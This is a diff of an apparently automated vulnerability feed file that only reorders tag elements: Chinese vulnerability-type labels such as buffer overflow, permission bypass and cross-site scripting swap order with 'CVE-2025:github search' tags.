@@ -6262,9 +6262,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -6289,9 +6289,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -6989,9 +6989,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8034,9 +8034,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -8354,9 +8354,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8381,9 +8381,9 @@
     
     <tags>
       
-      <tag>CVE-2024:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2024:github search</tag>
       
     </tags>
     
@@ -8508,9 +8508,9 @@
     
     <tags>
       
-      <tag>权限绕过</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>权限绕过</tag>
       
     </tags>
     
@@ -8562,9 +8562,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8643,9 +8643,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -8803,9 +8803,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
